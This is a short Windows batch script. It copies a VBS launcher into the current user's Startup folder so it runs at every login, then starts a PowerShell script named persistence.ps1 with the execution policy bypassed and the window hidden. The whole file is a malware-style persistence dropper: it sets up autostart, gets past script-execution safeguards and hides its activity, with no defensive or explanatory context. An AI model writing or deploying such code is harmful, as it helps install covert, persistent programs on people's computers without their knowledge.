@echo off
copy "%~dp0run_python_script.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

powershell -ExecutionPolicy Bypass -File "%~dp0persistence.ps1" -WindowStyle Hidden